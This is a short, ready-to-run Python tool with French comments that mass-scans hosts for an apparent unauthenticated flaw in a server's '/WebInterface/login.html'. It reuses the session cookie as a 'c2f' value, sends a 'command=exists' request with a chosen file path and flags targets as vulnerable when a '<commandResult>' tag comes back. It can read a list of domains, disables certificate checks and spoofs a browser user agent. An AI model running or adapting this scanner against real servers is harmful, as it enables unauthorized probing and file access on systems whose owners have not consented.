import requests
import argparse
from colorama import Fore, init

# Désactiver les avertissements SSL
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Initialiser Colorama pour les couleurs de texte
init(autoreset=True)

# Agent utilisateur pour les requêtes HTTP
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
header = {"User-Agent": user_agent}

def check_vulnerability(target: str, response_text: str, file: str):
    if "<commandResult>" in response_text:
        print(f"{Fore.GREEN}[+] {Fore.WHITE}{target} - VULNÉRABLE !{Fore.RESET}\n")
        # Optionnel : imprimer response_text pour le débogage
        # print(response_text)
    else:
        pass

def get_files(target: str, file: str):
    try:
        session = requests.Session()
        response = session.post(f"http://{target}/WebInterface/login.html", headers=header, verify=False)
        cookies = response.cookies

        data = {
            "command": "exists",
            "paths": file,
        }

        if 'currentAuth' in cookies:
            data['c2f'] = cookies['currentAuth']

        response = session.post(f"http://{target}/WebInterface/login.html", data=data, cookies=cookies, headers=header, verify=False)

        check_vulnerability(target, response.text, file)

    except requests.exceptions.SSLError as e:
        print(f"{Fore.RED}[!] Erreur SSL : {e}{Fore.RESET}")
    except requests.exceptions.ConnectionError:
        print(f"{Fore.RED}[!] Erreur de connexion pour {target}{Fore.RESET}")

def scan_domain(file: str, command: str):
    with open(file, "r") as f:
        domains = [x.strip() for x in f.readlines()]
    
    for domain in domains:
        get_files(domain, command)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="cible à scanner")
    parser.add_argument('-f', '--file', help="fichier à récupérer")
    parser.add_argument('-d', '--domains', help="fichier contenant la liste des domaines")
    args = parser.parse_args()

    if args.target and args.file:
        get_files(args.target, args.file)
    
    elif args.domains and args.file:
        scan_domain(args.domains, args.file)
    
    else:
        parser.print_help()

